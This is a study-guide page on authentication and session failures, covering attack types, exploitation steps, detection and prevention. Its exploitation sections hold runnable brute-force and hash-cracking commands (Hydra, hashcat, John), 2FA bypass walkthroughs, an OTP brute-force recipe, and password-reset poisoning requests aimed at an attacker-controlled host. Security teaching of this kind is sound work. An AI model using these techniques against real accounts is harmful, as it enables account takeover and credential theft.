---
title: Identification and Authentication Failures
---

# Identification and Authentication Failures

---

### Description

Identification and Authentication Failures occur when an application incorrectly implements identity verification, session management, or credential handling — allowing attackers to compromise passwords, session tokens, or assume other users’ identities.

## Fundamentals of Authentication

### Authentication vs Authorization

- **Authentication** verifies **who the user is** (identity verification).
- **Authorization** determines **what an authenticated user is allowed to access**.

Example:

```
User → Login → Authentication

↓

User Role = Admin

↓

Access Admin Dashboard

↓

Authorization
```

---

### Authentication Factors

Applications generally rely on one or more authentication factors.

**Something You Know**

- Password
- PIN
- Security Questions

**Something You Have**

- OTP
- Mobile Device
- Hardware Token
- Smart Card

**Something You Are**

- Fingerprint
- Face Recognition
- Iris Scan

Modern applications usually combine multiple factors (MFA) to improve security.

---

### Typical Authentication Flow

```
User

↓

Username + Password

↓

Credential Validation

↓

(Optional) MFA Verification

↓

Session / JWT Creation

↓

Authenticated Requests
```

Failures at any step may result in authentication bypass or account compromise.

---

### Session vs Token Authentication

**Session-Based Authentication**

- Server stores session information.
- Browser stores only a Session ID.
- Common in traditional web applications.

**Token-Based Authentication**

- Server issues JWT or Access Token.
- Client stores and sends the token with every request.
- Common in REST APIs and SPAs.

## Types of Attacks

### Credential-Based Attacks

**Brute Force Attack**

- Automated guessing of passwords
- Tries all combinations or dictionary lists
- Effective against weak passwords

**Credential Stuffing**

- Uses leaked username/password pairs from breaches
- Exploits password reuse across sites

**Password Spraying**

- Attempts one common password across many accounts
- Avoids lockout thresholds

---

### Session-Based Attacks

**Session Hijacking**

- Stealing valid session tokens (cookies, URLs)
- Attacker impersonates the user

**Session Fixation**

- Attacker forces victim to use a known session ID
- After login, attacker uses same session

---

### Authentication Logic Flaws

**Improper Login Validation**

- Bypassing authentication checks
- Weak password reset mechanisms

**Multi-Factor Authentication Bypass**

- Logic flaws in OTP or MFA flows
- Backup codes abuse

---

### Token Based Attacks

#### JWT Attacks

- Algorithm confusion (alg: none)
- Weak signing key / key confusion
- **`kid`** parameter injection / path traversal
- None / Signature stripping
- JKU header abuse

#### OAuth / OpenID Connect Misconfigurations

- Open redirect in `redirect_uri`
- Authorization code interception
- PKCE bypass
- Client secret leakage
- ID token misuse

#### Refresh Token Issues

- Refresh tokens not rotated or not invalidated on logout
- Stored in Local Storage
- Exposed in logs

### Identity Enumeration

**Username Enumeration**

- Determining valid users via error messages or timing
- Useful for targeted attacks

---

## Attack Surfaces

- Login pages
- Password reset / forgot password
- Registration Pages
- MFA/OTP verification endpoints
- API authentication endpoints
- OAuth
- SSO integrations
- Session cookies
- Account recovery mechanisms

---

## Exploitation

### Credential Bruteforcing

- One can bruteforce different passwords for a particular username using Burp Suite tools like Intruder, Turbo Intruder
- Usernames mostly are in the format

```bash
firstname.lastname@company.com
```

- Some high privileged accounts are created with the username
    - admin
    - administrator
- Passwords can be bruteforce with the help of some commonly used password’s wordlist
- The wordlists include passwords as
    - A minimum number of characters
    - A mixture of lower and uppercase letters
    - At least one special character
- One can create their own password wordlist using tools like
- **`cewl`**
    
    ```bash
    cewl https://target.com -d 2 -m 8 --with-numbers -w my-wordlist.txt
    ```
    
    - `-d` is used to specify the crawling depth
    - `-m` is used to specify the minimum length
    - `--with-numbers`  is used to include the numbers also while generating wordlist
- **`crunch`**

```bash
crunch <minimum-lenght> <maximum-length> <characters> -o outputfile
```

- Example

```bash
crunch 4 8 abcd1234 -o wordlist.txt
```

- Different command line tools can be used to bruteforce the credentials
    - **`Hydra`**
    
    ```bash
    hydra -L username.txt -P password.txt <HOST_NAME> http-post-form “<path>:username=^USER^&password=^PASS^:<invalid_response>”  -o  <file.txt>
    ```
    

### Username Enumeration

#### **Usernames enumeration via error messages**

- For a wrong username and password pair the application throws an error
- If the error messages is not configured correctly one can use the error messages to extract the usernames
- Example

```
Error: The password is not correct for the username
```

- Here the application reveals that the username exists but the password is incorrect

#### Username Enumeration via Different Response Timing

- The application may be configured such that first it checks if the username exists and then extract the password of the username
- There is a race window in between the process that will have a late response comparing to the response where the user name does not exists

### Bypassing 2FA using Forced Browsing

- Log in to your own account. Your 2FA verification code will be sent to you by email. Click the **Email client** button to access your emails.
- Go to your account page and make a note of the URL.
- Log out of your account.
- Log in using the victim's credentials.
- When prompted for the verification code, manually change the URL to navigate to `/my-account`.

### Flawed 2FA Verification Logic

#### Excess Client Side Trust

```
POST /login-steps/first
username=spider&password=qwerty
```

- User logs in with correct credentials
- Server verifies username + password
- Then sets a cookie:

```
Set-Cookie: account=carlos
```

- The application stores **user identity in a client-controlled cookie**

```
GET /login-steps/second
Cookie: account=carlos
```

- User is asked for OTP / verification code
- Server assumes this request belongs to spider because of the cookie
- No server-side validation of session-user binding

```
POST /login-steps/second
Cookie: account=carlos
verification-code=123456
```

- Server checks OTP
- If correct → login successful
- Attacker Logs in with Their Own Account

```
POST /login-steps/first
username=attacker&password=attackerpass
```

Server response:

```
Set-Cookie: account=attacker
```

- Intercept & Modify Request

Before submitting OTP:

```
POST /login-steps/second
Cookie: account=victim-use
verification-code=123456
```

- Attacker changes `account=attacker` → `account=victim-user`

#### The Login State

- If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code.
- In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step.
- Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page.

#### No Rate Limiting

If the OTP submit field is not protected with ratelimiting or account locking on multiple wrong guesses, one can bruteforce the OTP value using Burp Intruder 

#### Stripping the OTP parameter

- After successful submition of username and password we are redirected to the otp submit section.
- If we edit the request and does not supply any otp value (removing the total OTP validation parameter) the server does not check for the otp
- One can simply logged in to their account

### Offline Password Cracking

- Using some command line tools one can crack hashed password

#### Hashcat

- Dictionary Attack

```
hashcat -m 0 -a 0 hash.txt wordlist.txt --show
```

- `-m` is used to specify the type of hash algorithm
- `-a` is used to define the attack mode and `0` specify the dictionary attack
- `--show` is used to show the cracked password
- Bruteforce Attack

```
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a
```

- Mask Attack

```
hashcat -m 0 -a 3 hashes.txt Admin@?d?d?d
```

#### John The Ripper

```
john --wordlist=wordlist.txt hash.txt
```

#### Wordlists

- rockyou.txt ⇒

[https://github.com/RykerWilder/rockyou.txt](https://github.com/RykerWilder/rockyou.txt)

- Common password list

[https://github.com/josuamarcelc/common-password-list](https://github.com/josuamarcelc/common-password-list)

- SecLists

[https://github.com/danielmiessler/seclists](https://github.com/danielmiessler/seclists)

### Flawed Password Reset Functionality

#### Via Host Header

- Some times the application uses Host header value to create the password reset token link
- One can change the Host header value to an attacker controlled server address
- When the victim clicks on the link, it sends the token to the attacker server

```
GET /password-reset HTTP/2
Host: attacker-server.com
... 
```

#### Via Middleware

- One can use http header like X-Forwarded-Host that is used by different proxy server and CDNs

```
GET /password-reset HTTP/2
Host: example.com 
X-Forwarded-Host: attacker-server.com
...
```

---

## Advance Attack Scenarios

### Bruteforcing OTP for a Particular Session

- Some of the application block OTP bruteforcing by using Session Invalidation Rules
- After every two incorrect OTP attempts the application reset the session cookie and regenerate the OTP for the user.
- Creating a Session Handling Rule

In **Burp Suite**:

- Go to **Settings → Sessions → Add Rule**
- Scope → **Include all URLs**
- This tells Burp apply this rule to every request (important for automation)
- Configure a Macro (Auto Login Flow)
- You record a macro that mimics login:

Selected Requests:

```
GET /login => Loads the login page 
POST /login => Submit the credentials 
GET /login2 => Generate the OTP 
```

1. Loads login page
2. Submits credentials
3. Reaches OTP page
- Test the Macro:
- Click **Test Macro**
- Confirm final response shows:
    
    > “Enter 4-digit security code”
    > 
- This ensures:
    - Login works
    - Session is valid
    - Ready for OTP brute force
- Attach Macro to Requests
- Now Burp will automatically execute login flow BEFORE every request
- So even if session expires:
- Burp logs in again
- Then sends OTP attempt
- Send OTP Request to Intruder

Target request:

```
POST /login2
mfa-code=1234
```

Add payload position:

```
mfa-code=§1234§
```

- Configure Payloads
- Payload type → **Numbers**
- Range:
    
    ```
    0000 → 9999
    ```
    
- Settings:
    - Min digits = 4
    - Max digits = 4

Generates:

```
0000, 0001, 0002 ... 9999
```

- Set Resource Pool (IMPORTANT)
- Max concurrent requests = **1**
- It Prevents:
    - Session conflicts
    - Race conditions
    - Invalid macro execution
- Then Start Attack
- Intruder starts sending requests:

---

## Detection Techniques

### Manual Testing

- Test default and weak credentials using common username/password combinations (e.g., `admin/admin`, `admin/password`, `test/test`) via Burp Suite Intruder with a small controlled wordlist.
- Perform **credential stuffing** using leaked username/password pairs and observe login success or inconsistent error responses.
- Conduct **password spraying** by using a single common password across multiple usernames and monitoring for partial success or lockout behavior.
- Check for **username enumeration** by comparing response messages, HTTP status codes, and response lengths for valid vs invalid usernames.
- Use Burp Repeater to analyze **error message differences** during login, password reset, and registration flows.
- Test **rate limiting and lockout mechanisms** by sending repeated login attempts with controlled delays to observe blocking behavior.
- Verify **session handling issues** by checking if session cookies change after login and whether they persist after logout.
- Inspect cookies for missing security flags such as `HttpOnly`, `Secure`, and `SameSite`.
- Test **MFA/OTP enforcement** by:
    - Reusing intercepted requests without OTP
    - Submitting empty or modified OTP parameters
    - Attempting to access post-login pages directly
- Validate **password reset logic** by modifying reset tokens, reusing expired links, or altering email/host parameters in reset requests.
- Check for **authentication bypass via direct access** by manually navigating to authenticated endpoints after partial login steps.
- Analyze **JWT/session tokens** for weak validation (e.g., tampering payload, removing signature, changing algorithm).
- Observe whether authentication state is incorrectly trusted on the client side (e.g., cookies or local storage controlling login state).

---

## Impact

- **Account Takeover:** Attackers can gain unauthorized access to user or administrator accounts by bypassing authentication or compromising valid credentials.
- **Unauthorized Access to Sensitive Data:** Confidential information such as personal details, financial records, or internal business data can be accessed or disclosed.
- **Privilege Escalation:** Weak authentication or session management flaws may allow attackers to obtain higher privileges and perform unauthorized administrative actions.
- **Financial Fraud:** Compromised accounts can be misused to perform unauthorized transactions, purchases, or fund transfers.
- **Identity Theft:** Stolen credentials, session tokens, or authentication tokens can be used to impersonate legitimate users across one or more services.
- **Reputation Damage:** Successful authentication attacks can lead to loss of customer trust, regulatory penalties, and reputational harm to the organization.
- **Full System Compromise:** If privileged or administrative accounts are compromised, attackers may gain complete control over the application and potentially the underlying infrastructure.

---

## Prevention Techniques

### Strong Authentication

- Enforce strong password policy
- Use modern hashing (bcrypt, Argon2, PBKDF2)
- Implement MFA (prefer app-based or hardware keys)

### Secure Session Management

- Regenerate session ID after login
- Set cookies as:
    - HttpOnly
    - Secure
    - SameSite
- Short session timeouts
- Invalidate sessions on logout

### Anti-Automation Controls

- Rate limiting
- CAPTCHA (carefully implemented)
- Account lockout with monitoring
- IP reputation filtering

### Secure Recovery Mechanisms

- Strong password reset tokens
- One-time use links
- Short expiration times
- No user enumeration

### Secure Design

- Centralized authentication
- Use well-tested libraries
- Avoid custom crypto

---

## Tools

**Brute Force / Credential Testing**

- Burp Suite Intruder
- Burp Suite Turbo Intruder
- Hydra

**Wordlist Generator** 

- Cewl
- Crunch

**Password Hash Cracking**

- Hashcat
- John The Reaper

**Session Analysis**

- Burp Suite
- OWASP ZAP

---

## Good to Read

- [https://hackerone.com/reports/2529780](https://hackerone.com/reports/2529780)
- [https://hackerone.com/reports/838231](https://hackerone.com/reports/838231)
- [https://hackerone.com/reports/3160210](https://hackerone.com/reports/3160210)

---

## References

- [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)
- [https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [https://www.bugcrowd.com/hackers/bugcrowd-university/](https://www.bugcrowd.com/hackers/bugcrowd-university/)
- [https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [https://pages.nist.gov/800-63-3/](https://pages.nist.gov/800-63-3/)
- [https://portswigger.net/web-security/authentication](https://portswigger.net/web-security/authentication)